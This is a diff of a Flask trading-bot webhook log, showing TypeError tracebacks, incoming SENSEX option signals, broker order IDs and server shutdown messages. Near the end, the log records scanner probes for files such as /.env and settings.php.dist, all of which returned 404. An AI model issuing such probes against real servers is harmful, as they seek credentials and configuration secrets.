-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:54:17,719] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:13:03,447] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:13:08,773] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:13:14,090] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:13:19,409] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:40:02,109] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:40:09,127] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:40:14,470] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:40:19,788] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 07:54:31 +0000] [1998] [INFO] Worker exiting (pid: 1998)
-[2024-05-24 07:54:31 +0000] [1996] [INFO] Handling signal: term
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'SellPE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'BuyPE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'SellCE'}
-[2024-05-24 07:54:31 +0000] [1997] [INFO] Worker exiting (pid: 1997)
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'SellPE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'BuyCE'}
-[2024-05-24 07:54:31 +0000] [1999] [INFO] Worker exiting (pid: 1999)
-[2024-05-24 07:54:31 +0000] [1996] [ERROR] Worker (pid:1998) was sent SIGTERM!
-[2024-05-24 07:54:31 +0000] [1996] [INFO] Shutting down: Master
-[2024-05-24 07:54:36 +0000] [2522] [INFO] Worker exiting (pid: 2522)
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:06:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75450.94', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:16:00Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75427.98', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:28:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75448.75', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:28:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75448.75', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:36:01Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75423.69', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:46:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75437.88', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:13:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75409.07', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:35:00Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75427.78', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:40:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75449.35', 'strategy.order.comment': 'BuyCE'}
-[2024-05-24 07:54:36 +0000] [2482] [INFO] Handling signal: term
-[2024-05-24 07:54:36 +0000] [2523] [INFO] Worker exiting (pid: 2523)
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-23T10:09:00Z', 'strategy.order.price': 70913.14, 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:06:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75450.94', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:06:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75450.94', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:06:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75450.94', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:34:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75451.28', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:34:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75451.28', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:34:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75451.28', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:40:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75433.69', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:40:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75433.69', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:40:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75433.69', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:45:01Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75426.57', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:46:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75437.88', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:46:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75437.88', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:56:02Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75424.07', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:13:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75409.07', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:40:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75449.35', 'strategy.order.comment': 'BuyCE'}
-[2024-05-24 07:54:36 +0000] [2982] [INFO] Worker exiting (pid: 2982)
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:28:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75448.75', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:28:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75448.75', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:33:00Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75432.52', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:34:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75451.28', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:40:00Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75433.69', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:46:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75437.88', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:50:00Z', 'strategy.order.action': 'sell', 'strategy.order.price': '75427.92', 'strategy.order.comment': 'SellCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:54:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75439.34', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:54:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75439.34', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:54:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75439.34', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T06:54:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75439.34', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:13:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75409.07', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:13:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75409.07', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:40:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75449.35', 'strategy.order.comment': 'BuyCE'}
-Received data: {'ticker': 'SENSEX', 'timenow': '2024-05-24T07:40:01Z', 'strategy.order.action': 'buy', 'strategy.order.price': '75449.35', 'strategy.order.comment': 'BuyCE'}
-[2024-05-24 07:54:36 +0000] [2482] [ERROR] Worker (pid:2522) was sent SIGTERM!
-[2024-05-24 07:54:36 +0000] [2482] [ERROR] Worker (pid:2523) was sent SIGTERM!
-[2024-05-24 07:54:36 +0000] [2482] [INFO] Shutting down: Master
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:27:16,888 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:27:16] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:36:31,965 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T05:36:30Z",\n    "strategy.order.price": "76660.79000000001",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 05:36:31,966 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T05:36:30Z', 'strategy.order.price': '76660.79000000001', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+[I 240611 05:36:33 smart_api_client:77] OrderId: 240611000676134
+[I 240611 05:36:34 smart_api_client:85] Logout Successful
+2024-06-11 05:36:34,233 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:36:34] "POST /webhook HTTP/1.0" 200 -
+[I 240611 05:44:11 smartConnect:121] in pool
+ * Serving Flask app 'main'
+ * Debug mode: off
+2024-06-11 05:44:18,218 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2024-06-11 05:44:18,218 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2024-06-11 05:51:30,585 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T05:51:30Z",\n    "strategy.order.price": "76676.02",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:51:30,585 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T05:51:30Z', 'strategy.order.price': '76676.02', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:51:31,855 - __main__ - INFO - tradingsymbol: 
+[I 240611 05:51:32 smart_api_client:77] OrderId: 240611000719855
+[I 240611 05:51:32 smart_api_client:85] Logout Successful
+2024-06-11 05:51:32,938 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:51:32] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:07:02,557 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:07:00Z",\n    "strategy.order.price": "76660.39",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 06:07:02,557 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:07:00Z', 'strategy.order.price': '76660.39', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 06:07:03,767 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 06:07:04 smart_api_client:77] OrderId: 240611000767685
+[I 240611 06:07:04 smart_api_client:77] OrderId: 240611000767715
+[I 240611 06:07:05 smart_api_client:85] Logout Successful
+2024-06-11 06:07:05,300 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:07:05] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:10:15,433 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:10:15] "[33mGET /.env HTTP/1.0[0m" 404 -
+2024-06-11 06:10:15,517 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:10:15] "[33mPOST / HTTP/1.0[0m" 404 -
+2024-06-11 06:12:30,987 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:12:30Z",\n    "strategy.order.price": "76642.3",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 06:12:30,987 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:12:30Z', 'strategy.order.price': '76642.3', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 06:12:32,208 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 06:12:32 smart_api_client:77] OrderId: 240611000781951
+[I 240611 06:12:33 smart_api_client:77] OrderId: 240611000781977
+[I 240611 06:12:33 smart_api_client:85] Logout Successful
+2024-06-11 06:12:33,888 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:12:33] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:13:31,638 - __main__ - INFO - Received request: b'{\n"order_id": "BuyCE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:13:30Z",\n    "strategy.order.price": "76660.14",\n    "strategy.order.comment": "BuyCE",\n    "strategy.order.action": "buy"\n}\n'
+2024-06-11 06:13:31,638 - __main__ - INFO - Received data: {'order_id': 'BuyCE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:13:30Z', 'strategy.order.price': '76660.14', 'strategy.order.comment': 'BuyCE', 'strategy.order.action': 'buy'}
+2024-06-11 06:13:32,698 - __main__ - INFO - tradingsymbol: SENSEX2461476700PE
+[I 240611 06:13:33 smart_api_client:77] OrderId: 240611000784589
+[I 240611 06:13:33 smart_api_client:77] OrderId: 240611000784615
+[I 240611 06:13:34 smart_api_client:85] Logout Successful
+2024-06-11 06:13:34,280 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:13:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:27:31,910 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow": "2024-06-11T06:27:30Z",\n    "strategy.order.price": "76669.02",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 06:27:31,910 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow': '2024-06-11T06:27:30Z', 'strategy.order.price': '76669.02', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 06:27:33,080 - __main__ - INFO - tradingsymbol: SENSEX2461476600CE
+[I 240611 06:27:33 smart_api_client:77] OrderId: 240611000817612
+[I 240611 06:27:34 smart_api_client:77] OrderId: 240611000817635
+[I 240611 06:27:34 smart_api_client:85] Logout Successful
+2024-06-11 06:27:34,711 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:27:34] "POST /webhook HTTP/1.0" 200 -
+2024-06-11 06:31:50,857 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:50] "[33mGET / HTTP/1.0[0m" 404 -
+2024-06-11 06:31:51,354 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:51] "[33mGET /webapp/app.js HTTP/1.0[0m" 404 -
+2024-06-11 06:31:51,850 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:51] "[33mGET /i18n.json HTTP/1.0[0m" 404 -
+2024-06-11 06:31:53,352 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 06:31:53] "[33mGET /settings.php.dist HTTP/1.0[0m" 404 -
